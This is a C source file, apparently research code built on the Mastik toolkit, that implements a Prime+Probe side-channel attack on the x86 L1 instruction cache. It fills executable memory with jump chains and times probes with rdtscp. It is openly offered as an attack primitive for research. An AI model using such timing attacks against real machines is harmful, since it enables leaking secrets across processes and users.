/*
 * Mastik toolkit prime and probe attack 
 *
 * 
 * authors: 
 * Seonghun Son <seonghun@iastate.edu>
 * Daniel Moghimi <danielmm@googl.com>
 * Berk Gulmezoglu <bgulmez@iastate.edu>
 * 
 * Description:
 * Prime and Probe attack variants utilizing Mastik Toolkit L1i cache
 * 
 */

#include <unistd.h> /* sysconf(3) */
#include <sched.h>

#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <errno.h>

#include <time.h>

#include <x86intrin.h>


#define PAGE_SIZE 4096
#define NUM_EVENTS 3
#define THRES 100


#define VICTIM_ACCESS 10
/****************************************************************************************/
// Mastik l1i.c

#define L1I_ASSOCIATIVITY 8
#define L1I_CACHELINE 64
#define L1I_SETS 64 // Typically 64 sets in L1i cache

#define L1D_ASSOCIATIVITY 8
#define L1D_CACHELINE 64
#define L1D_SETS 64


#define JMP_OFFSET (PAGE_SIZE - 5)

#define JMP_OPCODE 0xE9
#define RET_OPCODE 0xC3

struct l1ipp {
    void *memory;
    uint8_t monitored[L1I_SETS];
    void *sets[L1I_SETS];
    int nsets;
};

typedef struct l1ipp *l1ipp_t;

#define SET(page, set, l1) (((uint8_t *)l1->memory) + PAGE_SIZE * (page) + L1I_CACHELINE * (set))

typedef void (*fptr)(void);
void l1i_randomise(l1ipp_t l1);


l1ipp_t l1i_prepare(void) {
    l1ipp_t l1 = (l1ipp_t)malloc(sizeof(struct l1ipp));
    l1->memory = mmap(0, PAGE_SIZE * L1I_ASSOCIATIVITY, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
    if (l1->memory == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < L1I_SETS; i++) {
        for (int j = 0; j < L1I_ASSOCIATIVITY - 1; j++) {
            uint8_t *p = SET(j, i, l1); // The address p from current way and set
            *p++ = JMP_OPCODE;
            *p++ = JMP_OFFSET & 0xff;           // Lower 8 bits of offset
            *p++ = (JMP_OFFSET >>8) & 0xff;     // Next 8 bits
            *p++ = (JMP_OFFSET >> 16) & 0xff;   // Next 8 bits
            *p++ = (JMP_OFFSET >> 24) & 0xff;   // Upper 8 bits (total 32 bits)
        }
        uint8_t *p = SET(L1I_ASSOCIATIVITY -1, i, l1);
        *p = RET_OPCODE;
    }

    l1->nsets = L1I_SETS;
    for (int i = 0; i < L1I_SETS; i++)
        l1->monitored[i] = i; // Used for probing stage


    l1->nsets = L1I_SETS;
    l1i_randomise(l1);
    return l1;
}
void l1i_randomise(l1ipp_t l1) {
  for (int i = 0; i < l1->nsets; i++) {
    int p = random() % (l1->nsets - i) + i;
    uint8_t t = l1->monitored[p];
    l1->monitored[p] = l1->monitored[i];
    l1->monitored[i] = t;
  }
}
void l1i_probe(l1ipp_t l1) {
    for (int i = 0; i < l1->nsets; i++) {
        fptr func = (fptr)SET(0, l1->monitored[i], l1);
        func();
    }
}

/****************************************************************************************/
l1ipp_t l1i = NULL; // Global variable for l1i
fptr test_func = NULL; // Global test function


void prime_cache(int target_way, int target_set, l1ipp_t l1);
uint64_t probe_cache(int target_way, int target_set, l1ipp_t l1);

extern void delay (uint64_t cycle);
//l1ipp_t l1i = NULL; // Global variable for l1i

void victim(int target_set1, l1ipp_t l1) {

    for(int way = 0; way < L1I_ASSOCIATIVITY; way++) {
        volatile uint8_t *victim_addr = (volatile uint8_t *)SET(way, target_set1, l1);
        
	_mm_clflush((const void *) victim_addr);
    }
    _mm_mfence();

}


void waste_cycle(uint64_t n){
    for(uint64_t i = 0; i < n; i++);
}

void warmup(){    
    waste_cycle(50000);
}

void prime_cache(int target_way, int target_set, l1ipp_t l1) {
    
    fptr prime_func = (fptr)SET(target_way, target_set, l1);
    prime_func();
    //_mm_mfence(); 
    
}


uint64_t probe_cache(int target_way, int target_set, l1ipp_t l1) {
    fptr probe_func = (fptr)SET(target_way, target_set, l1);
    unsigned int aux;

    uint64_t start = __rdtscp(&aux);
    //_mm_mfence();
    probe_func();
    uint64_t end = __rdtscp(&aux);
    //_mm_mfence();
    
    return end-start;
    //tSamples[i] = end - start; 
}


int main( int argc, char **argv )
{ 
 
    if (argc < 2){
        printf("usage: %s <target_set> <delay_cycle> <nsamples> !!!\n", argv[0]);
        return 1;
    }

    l1i = l1i_prepare();


    int target_set1 = atoi(argv[1]);
    int delayLoopCount = atoi(argv[2]);
    uint64_t nSamples = atoi(argv[3]);
    uint64_t num_ways = 8;


  

    uint64_t *tSamples = malloc(nSamples * num_ways * sizeof(uint64_t));
    if (tSamples == NULL) {
	    perror("malloc");
	    exit(EXIT_FAILURE);
    }
    memset(tSamples, 0, nSamples * num_ways * sizeof(uint64_t)); // Initialize to zero
 
    delay(1000000); // Warmup loop



    for(uint64_t i = 0; i < nSamples; i++){
	    
	    for (uint64_t j = 0; j < num_ways; j ++)
	    {
		    //prime
		    prime_cache(j,target_set1, l1i);

		    //delay
		    delay(delayLoopCount);
	
		    //probe
		    tSamples[i * num_ways + j] = probe_cache(j,target_set1, l1i);

	    }
	    //printf("\n");
    }


    for(uint64_t i = 0; i < nSamples; i++) {
        uint64_t min = UINT64_MAX;

        for(uint8_t j = 0; j < num_ways; j++) {
            uint64_t current_t = tSamples[i * num_ways + j];
            printf("%llu, ", current_t);

            if(current_t < min) {
                min = current_t;
            }
        }

        if (min < THRES && min > 0) {
            // printf("1");
        } else {
            // printf("0");
        }

        printf("\n"); 
    }
 
    munmap(l1i->memory, PAGE_SIZE * L1I_ASSOCIATIVITY);
  free(tSamples);
  free(l1i);
  return 0;
}


